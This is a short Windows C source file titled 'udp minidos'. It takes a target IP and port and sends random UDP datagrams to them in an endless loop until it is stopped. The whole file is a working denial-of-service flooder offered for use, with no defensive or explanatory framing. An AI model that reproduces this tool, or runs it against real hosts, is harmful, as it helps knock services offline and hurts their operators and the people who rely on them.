#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment( lib, "ws2_32.lib" )

#define BUFSIZE 0x200

int main( int argc, char **argv )
{
	WSADATA wsaData;
	WORD wVersionRequested;
	SOCKET s;
	struct sockaddr_in sa;
	char buf[BUFSIZE];
	int i;

	printf( "udp minidos //pm\n" );

	if( argc < 3 )
	{
		printf( "usage: %s <ip> <port>\n", argv[0] );
		exit( 1 );
	}

	wVersionRequested = MAKEWORD(1, 1);
	if( WSAStartup( wVersionRequested, &wsaData ) < 0 )
	{
		fprintf( stderr, "WSAStartup error\n\n" );
		return 1;
	}
	
	if( ( s = socket( AF_INET, SOCK_DGRAM, 0 ) ) == INVALID_SOCKET )
	{
		perror( "socket" );
		WSACleanup();
		return 1;
	}
	
	ZeroMemory( &sa, sizeof( struct sockaddr_in ) );
	
	sa.sin_family		= AF_INET;
	sa.sin_port		= htons( ( short )atoi( argv[2] ) );
	sa.sin_addr.s_addr	= inet_addr( argv[1] );

	printf( "press ctrl+c to stop\n\n" );
	
	for( ; ; )
	{
		for( i = 0; i < BUFSIZE; i++ )
		{
			buf[i] = ( char )( rand() % 0x100 );
		}

		if( sendto( s, buf, strlen( buf ), 0, ( const struct sockaddr * )&sa, sizeof( struct sockaddr_in ) ) < 0 )
		{
			perror("sending datagram message");
		}
	}
}